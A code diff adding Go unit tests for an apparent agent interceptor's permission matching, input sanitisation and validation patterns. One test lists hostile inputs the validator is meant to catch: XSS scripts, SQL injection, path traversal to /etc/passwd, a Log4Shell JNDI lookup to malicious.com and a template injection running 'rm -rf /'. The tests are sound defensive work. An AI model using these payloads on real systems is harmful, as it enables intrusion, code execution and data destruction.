@@ -87,6 +87,108 @@ func TestRateLimitingAgentInterceptor(t *testing.T) {
 	}
 }
 
+func TestMatchesPermission(t *testing.T) {
+	tests := []struct {
+		userPerm     string
+		requiredPerm string
+		expected     bool
+		description  string
+	}{
+		{"read", "read", true, "exact match"},
+		{"read", "write", false, "different permissions"},
+		{"admin*", "admin.users", true, "wildcard match"},
+		{"admin*", "admin", false, "wildcard should not match prefix itself"},
+		{"*", "anything", false, "empty prefix should not match"},
+		{"", "read", false, "empty user permission"},
+		{"read*", "readonly", true, "prefix match"},
+		{"read*", "writeonly", false, "no prefix match"},
+	}
+
+	for _, test := range tests {
+		result := matchesPermission(test.userPerm, test.requiredPerm)
+		if result != test.expected {
+			t.Errorf("%s: matchesPermission(%q, %q) = %v, want %v", 
+				test.description, test.userPerm, test.requiredPerm, result, test.expected)
+		}
+	}
+}
+
+func TestSanitizeValue(t *testing.T) {
+	tests := []struct {
+		input       interface{}
+		expectedStr string
+		description string
+	}{
+		{"<script>alert('xss')</script>", "&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;", "XSS script tag"},
+		{"Hello\x00World", "HelloWorld", "null byte removal"},
+		{"Line1\r\nLine2\nLine3\r", "Line1 Line2 Line3 ", "line ending normalization"},
+		{strings.Repeat("A", 15000), strings.Repeat("A", 10000), "string length limit"},
+		{map[string]interface{}{"<script>": "alert('xss')"}, "", "map key/value sanitization"},
+	}
+
+	for _, test := range tests {
+		result := sanitizeValue(test.input)
+		
+		switch test.input.(type) {
+		case string:
+			if str, ok := result.(string); ok {
+				if str != test.expectedStr {
+					t.Errorf("%s: got %q, want %q", test.description, str, test.expectedStr)
+				}
+			} else {
+				t.Errorf("%s: result is not a string", test.description)
+			}
+		case map[string]interface{}:
+			if m, ok := result.(map[string]interface{}); ok {
+				// Check that keys and values are sanitized
+				for k, v := range m {
+					if strings.Contains(k, "<script>") || strings.Contains(v.(string), "<script>") {
+						t.Errorf("%s: map not properly sanitized: %v", test.description, m)
+					}
+				}
+			}
+		}
+	}
+}
+
+func TestDefaultValidationConfig(t *testing.T) {
+	config := DefaultValidationConfig()
+	
+	// Test that dangerous patterns are caught
+	dangerousInputs := []string{
+		"<script>alert('xss')</script>",
+		"javascript:alert('xss')",
+		"JAVASCRIPT:alert('xss')", // Case insensitive
+		"data:text/html,<script>alert('xss')</script>",
+		"onload=alert('xss')",
+		"eval('malicious')",
+		"UNION SELECT * FROM users",
+		"DROP TABLE users",
+		"../../../etc/passwd",
+		"${jndi:ldap://malicious.com}",
+		"<%=system('rm -rf /')%>",
+	}
+	
+	// Compile patterns
+	compiledPatterns := make([]*regexp.Regexp, len(config.ForbiddenPatterns))
+	for i, pattern := range config.ForbiddenPatterns {
+		compiledPatterns[i] = regexp.MustCompile(pattern)
+	}
+	
+	for _, input := range dangerousInputs {
+		found := false
+		for _, pattern := range compiledPatterns {
+			if pattern.MatchString(input) {
+				found = true
+				break
+			}
+		}
+		if !found {
+			t.Errorf("Dangerous input not caught by validation patterns: %s", input)
+		}
+	}
+}
+
 func TestRateLimitingToolInterceptor(t *testing.T) {
 	interceptor := RateLimitingToolInterceptor(1, time.Second)
 
@@ -114,7 +216,7 @@ func TestRateLimitingToolInterceptor(t *testing.T) {
 	}
 }
 
-func TestDefaultValidationConfig(t *testing.T) {
+func TestDefaultValidationConfigBasic(t *testing.T) {
 	config := DefaultValidationConfig()
 
 	if config.MaxInputSize <= 0 {
